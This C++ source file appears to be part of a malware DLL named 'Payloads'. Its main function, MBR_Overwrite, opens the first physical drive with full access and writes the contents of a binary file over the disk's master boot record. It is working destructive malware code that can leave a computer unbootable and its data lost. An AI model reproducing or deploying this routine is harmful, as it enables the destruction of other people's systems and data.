// Payloads.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"

namespace Payloads
{
	void GetDesktopResolution(int& horizontal, int& vertical) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); horizontal = desktop.right; vertical = desktop.bottom; }

	void Payloads::MBR_Overwrite()
	{
		DWORD dw;
		LPCWSTR pathToBin = L"C:\\Windows\\data.bin";
		HANDLE drive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		if (drive != INVALID_HANDLE_VALUE) {
			HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
			if (binary != INVALID_HANDLE_VALUE) {
				DWORD size = GetFileSize(binary, 0);
				if (size > 0) {
					BYTE *mbr = new BYTE[size];
					if (ReadFile(binary, mbr, size, &dw, 0)) {
						NULL;
						if (WriteFile(drive, mbr, size, &dw, 0)) {
							NULL;
						}
					}
				}
			}
			CloseHandle(binary);
		}
		CloseHandle(drive);
		_getch();
	}
}
